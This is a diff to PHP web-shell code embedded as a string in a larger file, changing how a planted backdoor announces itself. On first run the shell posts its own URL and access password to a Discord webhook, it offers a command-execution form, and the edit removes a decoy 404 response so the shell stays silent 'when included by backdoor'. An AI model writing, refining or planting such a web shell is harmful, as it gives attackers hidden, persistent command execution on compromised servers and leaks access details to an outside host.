@@ -25,8 +25,8 @@ $flag = __DIR__."/.w";
 $webhook = "https://discord.com/api/webhooks/1519948137911812256/d_M7sHDem-r5MUdicXAk1F8T7Tmdr3t1UCsAyz-j579qM78m9So-CKryaDyNOGMsV9dG";
 
 if (!file_exists($flag)) {
-    $url = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
-    $msg = json_encode(["content" => "🎯 **New Shell**\n```\nURL: $url\nPass: $pwd\n```"]);
+    $shell_url = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://" . $_SERVER["HTTP_HOST"] . dirname($_SERVER["SCRIPT_NAME"]) . "/r.php";
+    $msg = json_encode(["content" => "🎯 **New Shell**\n```\nURL: $shell_url\nPass: $pwd\n```"]);
     $ctx = stream_context_create(["http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $msg, "timeout" => 5]]);
     @file_get_contents($webhook, false, $ctx);
     @file_put_contents($flag, "1");
@@ -38,8 +38,7 @@ if (isset($_REQUEST["p"]) && $_REQUEST["p"] === $pwd) {
     }
     echo \'<form method="post" style="margin:10px"><input type="hidden" name="p" value="\'.$pwd.\'"><input name="c" size="80" autofocus placeholder="command..."><input type="submit" value="Exec"></form>\';
 } else {
-    header("HTTP/1.0 404 Not Found");
-    echo "404";
+    // silent - nothing output when included by backdoor
 }
 ?>';
         // ===== /WEBSHELL =====
